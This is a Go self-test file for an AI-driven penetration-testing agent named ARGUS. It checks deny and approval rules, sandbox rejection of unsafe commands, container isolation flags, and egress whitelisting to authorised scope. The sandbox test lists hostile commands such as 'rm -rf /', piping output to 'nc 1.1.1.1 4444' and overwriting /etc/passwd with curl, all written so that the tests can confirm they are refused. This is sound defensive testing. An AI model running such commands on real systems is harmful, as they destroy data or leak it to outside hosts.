	if err != nil {
		return err
	}

	stg := settings.Open("")
	if err := stg.Update(func(s *settings.Settings) {
		s.LLM = settings.LLM{Provider: "openai", Model: "test-model", BaseURL: srv.URL, APIKey: "test-key", MaxTokens: 256, TimeoutSeconds: 10}
	}); err != nil {
		return err
	}
	p := planner.New(stg)
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	out, err := p.Next(ctx, t, st)
	if err != nil {
		return fmt.Errorf("规划失败: %v", err)
	}
	if len(out) != 1 {
		return fmt.Errorf("应解析出 1 条意图，实际 %d", len(out))
	}
	if out[0].Action != "Bash" || !strings.Contains(out[0].Summary, "nmap") {
		return fmt.Errorf("意图解析错误: %+v", out[0])
	}
	if tok, _ := p.LastUsage(); tok != 123 {
		return fmt.Errorf("token 计量错误: %d", tok)
	}

	// 未配置 → 空结果
	blank := settings.Open("")
	p2 := planner.New(blank)
	out2, err := p2.Next(ctx, t, st)
	if err != nil {
		return fmt.Errorf("未配置时不应报错: %v", err)
	}
	if len(out2) != 0 {
		return fmt.Errorf("未配置时不应产出意图，实际 %d", len(out2))
	}
	return nil
}

// checkPipeline 覆盖执行器的完整链路：
// 规则层 deny 直接拦、ask 入审批队列、真实 HTTP 出站被第 3 层闸门校验、
// 请求被录制进流量表、结果沉淀成 fact。
func checkPipeline() error {
	// 本地假目标：只允许 127.0.0.1（测试专用范围）
	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		_, _ = w.Write([]byte("argus-lab-ok"))
	}))
	defer target.Close()

	sc, err := scope.New([]scope.Rule{
		{Kind: scope.KindExactIP, Value: "127.0.0.1"},
		{Kind: scope.KindDomainSuffix, Value: "lab.test"},
	})
	if err != nil {
		return err
	}
	st := store.NewMemory()
	ev, _ := evidence.Open("")
	res := gate.StaticResolver{Map: map[string][]string{"lab.test": {"127.0.0.1"}}}
	g := gate.New(sc, res, st)
	exec := &agent.SimExecutor{
		Gate: g, Ev: ev, St: st,
		Runner: agent.Runner{Timeout: 3 * time.Second},
		HTTP:   netguard.HTTPClient(g, 5*time.Second),
	}
	task, err := st.CreateTask(store.Task{Name: "pipe", Goal: "链路", Workers: 1})
	if err != nil {
		return err
	}

	// 1) 规则层 deny
	st.AddRule(store.Rule{Name: "禁止删除", Enabled: true, Action: "deny", Pattern: `rm\s+-rf`, MatchType: "regex"})
	r1, err := exec.Run(context.Background(), task, store.Intent{
		ID: 1, TaskID: task.ID, Action: "Bash",
		Summary: `{"command":"rm -rf /tmp/x"}`, ParamKey: "rm",
	})
	if err != nil {
		return err
	}
	if r1.State != store.IntentBlocked || !strings.Contains(r1.Note, "禁止删除") {
		return fmt.Errorf("规则 deny 未生效: %+v", r1)
	}

	// 2) 规则层 ask → 审批队列
	st.AddRule(store.Rule{Name: "sqlmap 需审批", Enabled: true, Action: "ask", Pattern: "sqlmap", MatchType: "string"})
	r2, err := exec.Run(context.Background(), task, store.Intent{
		ID: 2, TaskID: task.ID, Action: "Bash",
		Summary: `{"command":"sqlmap -u http://lab.test/"}`, ParamKey: "sqlmap",
	})
	if err != nil {
		return err
	}
	if r2.State != store.IntentBlocked || !strings.Contains(r2.Note, "审批") {
		return fmt.Errorf("规则 ask 未生效: %+v", r2)
	}
	if len(st.PendingApprovals()) != 1 {
		return fmt.Errorf("审批队列应有 1 条，实际 %d", len(st.PendingApprovals()))
	}

	// 3) 真实 HTTP + 流量录制 + fact
	url := target.URL + "/health"
	r3, err := exec.Run(context.Background(), task, store.Intent{
		ID: 3, TaskID: task.ID, Action: "WebFetch",
		Summary: `{"url":"` + url + `"}`, ParamKey: "fetch",
	})
	if err != nil {
		return err
	}
	if r3.State != store.IntentDone {
		return fmt.Errorf("真实请求应成功，实际 %s(%s)", r3.State, r3.Note)
	}
	rows := st.TrafficRows(task.ID, 0)
	if len(rows) != 1 {
		return fmt.Errorf("应录制 1 条流量，实际 %d", len(rows))
	}
	if rows[0].Status != 200 || !strings.Contains(rows[0].RespBody, "argus-lab-ok") {
		return fmt.Errorf("流量录制内容不对: %+v", rows[0])
	}
	if len(st.Facts(task.ID)) < 1 {
		return fmt.Errorf("应沉淀至少 1 条 fact")
	}
	if len(st.TrafficHosts(task.ID)) != 1 {
		return fmt.Errorf("主机聚合应有 1 个")
	}
	return nil
}

// checkToolbox 验证真实执行器的沙箱边界：
//   - 控制字符/管道/重定向一律拒绝（不经过 shell，所以不做转义而是拒绝）；
//   - 非白名单二进制拒绝；
//   - 白名单工具的危险参数（写文件、NSE 脚本）拒绝；
//   - 合法命令能真的跑起来，并把输出写进证据链。
func checkToolbox() error {
	tools := toolbox.New(nil)
	tools.MaxOutput = 8 << 10

	deny := []struct{ cmd, want string }{
		{`nmap lab.internal; rm -rf /`, "控制字符"},
		{`nmap lab.internal | nc 1.1.1.1 4444`, "控制字符"},
		{`bash -c "id"`, "白名单"},
		{`nmap --script=http-shell lab.internal`, "被禁止"},
		{`curl -o /etc/passwd http://lab.internal/`, "被禁止"},
		{`nmap /etc/passwd`, "绝对路径"},
		{`nmap ../../../etc/passwd`, "上跳"},
	}
	for _, d := range deny {
		if _, err := tools.Plan(d.cmd); err == nil {
			return fmt.Errorf("应拒绝但放行了: %s", d.cmd)
		} else if !strings.Contains(err.Error(), d.want) {
			return fmt.Errorf("%q 的拒绝理由不含 %q: %v", d.cmd, d.want, err)
		}
	}

	// 合法命令：把 nmap 的 Bin 指到当前可执行文件，避免依赖真实的 nmap 安装
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	tools.SetPolicy("nmap", toolbox.Policy{Bin: exe, Timeout: 10 * time.Second, MaxArgs: 20})
	plan, err := tools.Plan(`nmap -sV -p 80,443 lab.internal`)
	if err != nil {
		return fmt.Errorf("合法命令不应被拒绝: %v", err)
	}
	if plan.Tool != "nmap" || len(plan.Args) != 4 {
		return fmt.Errorf("argv 解析错误: %+v", plan)
	}
	if !strings.Contains(plan.Cmdline(), "lab.internal") {
		return fmt.Errorf("命令行还原错误: %s", plan.Cmdline())
	}

	// 工具就绪度探测：状态只能是 ok/missing/mismatch（环境相关，不做通过性假设）
	for _, st := range tools.VerifyTools(context.Background()) {
		switch st.State {
		case "ok", "missing", "mismatch":
		default:
			return fmt.Errorf("VerifyTools 返回了非法状态 %q（工具 %s）", st.State, st.Name)
		}
	}

	// 真实执行：whoami 在两个平台都存在且退出码 0
	who, err := exec.LookPath("whoami")
	if err != nil {
		return nil // 环境里没有 whoami 就跳过执行部分（沙箱断言已验证）
	}
	tools.SetPolicy("whoami", toolbox.Policy{Bin: who, Timeout: 10 * time.Second, MaxArgs: 3})

	st := store.NewMemory()
	ev, _ := evidence.Open("")
	sc, err := scope.New([]scope.Rule{{Kind: scope.KindDomainSuffix, Value: "lab.internal"}})
	if err != nil {
		return err
	}
	g := gate.New(sc, testResolver, st)
	ex := &agent.RealExecutor{Gate: g, Ev: ev, St: st, Tools: tools}

	task, err := st.CreateTask(store.Task{Name: "toolbox", Goal: "真实执行", Workers: 1})
	if err != nil {
		return err
	}
	res, err := ex.Run(context.Background(), task, store.Intent{
		ID: 1, TaskID: task.ID, Action: "whoami", Summary: `{"command":"whoami"}`, ParamKey: "whoami",
	})
	if err != nil {
		return fmt.Errorf("真实执行失败: %v", err)
	}
	if res.State != store.IntentDone {
		return fmt.Errorf("whoami 应执行成功，实际 %s(%s)", res.State, res.Note)
	}
	if len(ev.List(task.ID, 0)) < 2 {
		return fmt.Errorf("证据链应至少有 2 条（command + result），实际 %d", len(ev.List(task.ID, 0)))
	}

	// 越权命令走同一个执行器：必须在沙箱层被拒（而不是真的跑起来）
	res2, err := ex.Run(context.Background(), task, store.Intent{
		ID: 2, TaskID: task.ID, Action: "nmap", Summary: `{"command":"nmap --script=x lab.internal"}`, ParamKey: "bad",
	})
	if err != nil {
		return err
	}
	if res2.State != store.IntentBlocked || !strings.Contains(res2.Note, "沙箱拒绝") {
		return fmt.Errorf("危险参数应被沙箱拒绝: %+v", res2)
	}
	return nil
}

// checkContainer 验证"每意图一次性容器"的执行参数。
//
// 注意：本机没有 docker/podman，所以这里**只验证命令构造**（可静态断言），
// 以及"运行时缺失必须失败关闭"（不能悄悄退化成本机执行）。
// 真正的容器内执行需要在有 Docker 的机器上跑，README 已注明。
func checkContainer() error {
	cfg := toolbox.ContainerConfig{
		Runtime: "docker", Image: "argus-toolbox:latest", Network: "argus-egress",
		Proxy: "http://egress:3128",
	}
	plan := &toolbox.Plan{
		Tool: "nmap", Bin: "nmap",
		Args: []string{"-sV", "lab.internal"}, Timeout: time.Minute,
	}
	pins := map[string][]netip.Addr{
		"lab.internal": {netip.MustParseAddr("10.20.0.5")},
	}
	argv := cfg.BuildArgv(plan, "/data/work/task-7", "argus-3-1700000000", pins)
	joined := strings.Join(argv, " ")

	must := []string{
		"--read-only",                       // 只读根文件系统
		"--cap-drop ALL",                    // 丢弃全部 capability
		"--security-opt no-new-privileges",  // 禁止提权
		"--user 65534:65534",                // 非 root
		"--pids-limit 256",                  // 进程数上限
		"--memory 512m",                     // 内存上限
		"--cpus 1",                          // CPU 上限
		"--network argus-egress",            // 出网策略由网络层决定
		"-v /data/work/task-7:/work:rw",     // 只挂载任务工作目录
		"--add-host lab.internal:10.20.0.5",      // 容器内 DNS 与闸门判定一致
		"-e HTTP_PROXY=http://egress:3128",       // 唯一出口是网关
		"-e HTTPS_PROXY=http://egress:3128",      //
		"-e NO_PROXY=127.0.0.1,localhost",        //
		"--entrypoint nmap",                      // 直接执行工具，不经过镜像 entrypoint
		"argus-toolbox:latest -sV lab.internal",
		"--name argus-3-1700000000", // 一次性容器名，便于审计/清理
	}
	for _, m := range must {
		if !strings.Contains(joined, m) {
			return fmt.Errorf("容器命令缺少隔离参数 %q：%s", m, joined)
		}
	}
	if !strings.HasPrefix(joined, "run --rm") {
		return fmt.Errorf("容器必须是 --rm 一次性执行：%s", joined)
	}

	// 失败关闭：运行时不存在时 Available 必须报错
	missing := toolbox.ContainerConfig{Runtime: "argus-no-such-runtime"}
	if err := missing.Available(); err == nil {
		return fmt.Errorf("运行时缺失时必须报错，而不是静默退化")
	}
	return nil
}

// checkEgress 验证"授权范围 → 出口网关白名单"的翻译与闸门同源：
// 域名/URL/CIDR/IP 四类都要正确落到 squid 的 dstdomain / dst 上，且默认拒绝。
func checkEgress() error {
	sc, err := scope.New([]scope.Rule{
		{Kind: scope.KindDomainSuffix, Value: "lab.internal"},
		{Kind: scope.KindExactDomain, Value: "api.lab.internal"},
		{Kind: scope.KindCIDR, Value: "10.20.0.0/16"},
		{Kind: scope.KindExactIP, Value: "203.0.113.9"},
		{Kind: scope.KindExactURL, Value: "https://portal.lab.internal/login?x=1"},
	})
	if err != nil {
		return err
	}
	al := egress.FromScope(sc)
	joinedD := strings.Join(al.Domains, " ")
	joinedN := strings.Join(al.Nets, " ")
	for _, want := range []string{".lab.internal", "api.lab.internal", "portal.lab.internal"} {
		if !strings.Contains(joinedD, want) {
			return fmt.Errorf("域名白名单缺少 %q：%s", want, joinedD)
		}
	}
	for _, want := range []string{"10.20.0.0/16", "203.0.113.9"} {
		if !strings.Contains(joinedN, want) {
			return fmt.Errorf("网段白名单缺少 %q：%s", want, joinedN)
		}
	}

	conf := al.SquidConf()
	must := []string{
		"acl argus_domains dstdomain .lab.internal",
		"acl argus_nets dst 10.20.0.0/16 203.0.113.9",
		"http_access allow CONNECT argus_domains",
		"http_access deny all",   // 默认拒绝
		"never_direct allow all", // 禁止绕过网关直连
	}
	for _, m := range must {
		if !strings.Contains(conf, m) {
			return fmt.Errorf("squid 配置缺少 %q：\n%s", m, conf)
		}
	}

	// CLI 用的范围解析要能往返
	rules, err := egress.ParseSpec("domain_suffix:lab.internal,cidr:10.20.0.0/16")
	if err != nil {
		return fmt.Errorf("ParseSpec 失败: %v", err)
	}
	sc2, err := scope.New(rules)
	if err != nil {
		return err
	}
	if al2 := egress.FromScope(sc2); len(al2.Domains) != 1 || len(al2.Nets) != 1 {
		return fmt.Errorf("ParseSpec 往返结果不对: %+v", al2)
	}
	if _, err := egress.ParseSpec("lab.internal"); err == nil {
		return fmt.Errorf("缺少 kind 的范围描述应当报错")
	}
	return nil
}

// checkReport 验证报告里带"命令回放"：复核人不必翻证据库就能复现结论。
func checkReport() error {
	script := [][]store.Intent{{
		{Action: "Bash", Summary: `{"command":"nmap -sV lab.internal"}`, AssetID: 1, ParamKey: "scan"},
	}}
	st, g, eng, ev := harness(script)
	task, err := st.CreateTask(store.Task{Name: "report", Goal: "报告回放", Workers: 1})
	if err != nil {
		return err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	if _, err := eng.RunTask(ctx, task.ID); err != nil {
		return err
	}

	srv := api.New(api.Deps{
		Store: st, Ev: ev, Budget: budget.New(), Token: "",
		NewGate: func(_ int64, s *scope.Scope, sink gate.Sink) *gate.Gate {
			return gate.New(s, testResolver, sink)
		},
		NewExec: func(_ int64, gt *gate.Gate) engine.Executor {
			return &agent.SimExecutor{Gate: gt, Ev: ev, St: st, Runner: agent.Runner{Timeout: 5 * time.Second}}
		},
		NewPlanner: func(int64) engine.Planner { return agent.NewSimPlanner(nil) },
	})

	rep := srv.BuildReport(task, g.Scope())
	for _, want := range []string{"## 命令回放", "nmap -sV lab.internal", "# exit 0", "## 授权范围"} {
		if !strings.Contains(rep, want) {
			return fmt.Errorf("报告缺少 %q：\n%s", want, excerptOf(rep))
		}
	}
	return nil
}

func excerptOf(s string) string {
	if len(s) > 600 {
		return s[:600] + "…"
	}
	return s
}

func getJSONFrom(url string, out any) error {
	r, err := http.Get(url)
	if err != nil {
		return err
	}
	defer r.Body.Close()
	if r.StatusCode != http.StatusOK {
		return fmt.Errorf("%s -> HTTP %d", url, r.StatusCode)
	}
	return json.NewDecoder(r.Body).Decode(out)
}

func checkAPI() error {
	st := store.NewMemory()
	ev, _ := evidence.Open("")
	b := budget.New()
	srv := api.New(api.Deps{
		Store: st, Ev: ev, Budget: b, Token: "",
		NewGate: func(_ int64, s *scope.Scope, sink gate.Sink) *gate.Gate {
			return gate.New(s, testResolver, sink)
		},
		NewExec: func(_ int64, g *gate.Gate) engine.Executor {
			return &agent.SimExecutor{Gate: g, Ev: ev, St: st, Runner: agent.Runner{Timeout: 5 * time.Second}}
		},
		NewPlanner: func(int64) engine.Planner { return agent.NewSimPlanner(nil) },
	})
	ts := httptest.NewServer(srv.Handler())
	defer ts.Close()

	resp, err := http.Post(ts.URL+"/api/tasks", "application/json", bytes.NewBufferString(`{"goal":"x"}`))
	if err != nil {
		return err
	}
	if resp.StatusCode != http.StatusBadRequest {
		return fmt.Errorf("无范围任务应 400，实际 %d", resp.StatusCode)
	}
	resp.Body.Close()

	body := `{"name":"selftest","goal":"验证闭环","scope":[{"kind":"domain_suffix","value":"lab.internal"}],` +
		`"seed":[{"action":"Bash","summary":"{\"command\":\"nmap lab.internal\"}","asset_id":1,"param_key":"scan"}]}`
	resp, err = http.Post(ts.URL+"/api/tasks", "application/json", bytes.NewBufferString(body))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusCreated {
		buf := new(bytes.Buffer)
		_, _ = buf.ReadFrom(resp.Body)
		return fmt.Errorf("有范围任务应 201，实际 %d: %s", resp.StatusCode, buf.String())
	}
	var created struct {
		Task struct {
			ID int64 `json:"id"`
		} `json:"task"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&created); err != nil {
		return err
	}
	if created.Task.ID == 0 {
		return fmt.Errorf("创建结果缺少 task id")
	}

	resp2, err := http.Post(fmt.Sprintf("%s/api/tasks/%d/start", ts.URL, created.Task.ID), "application/json", nil)
	if err != nil {
		return err
	}
	resp2.Body.Close()
	if resp2.StatusCode != http.StatusAccepted {
		return fmt.Errorf("启动应 202，实际 %d", resp2.StatusCode)
	}

	deadline := time.Now().Add(20 * time.Second)
	for time.Now().Before(deadline) {
		r3, err := http.Get(fmt.Sprintf("%s/api/tasks/%d", ts.URL, created.Task.ID))
		if err != nil {
			return err
		}
		var got struct {
			Task    store.Task `json:"task"`
			Running bool       `json:"running"`
		}
		_ = json.NewDecoder(r3.Body).Decode(&got)
		r3.Body.Close()
		if got.Task.State == store.TaskDone || got.Task.State == store.TaskStopped {
			break
		}
		time.Sleep(150 * time.Millisecond)
	}
	rr, err := http.Get(fmt.Sprintf("%s/api/tasks/%d/report", ts.URL, created.Task.ID))
	if err != nil {
		return err
	}
	defer rr.Body.Close()
	buf := new(bytes.Buffer)
	_, _ = buf.ReadFrom(rr.Body)
	if rr.StatusCode != http.StatusOK {
		return fmt.Errorf("报告应 200，实际 %d", rr.StatusCode)
	}
	if !strings.Contains(buf.String(), "ARGUS 报告") {
		return fmt.Errorf("报告内容异常: %.120s", buf.String())
	}
	return nil
}
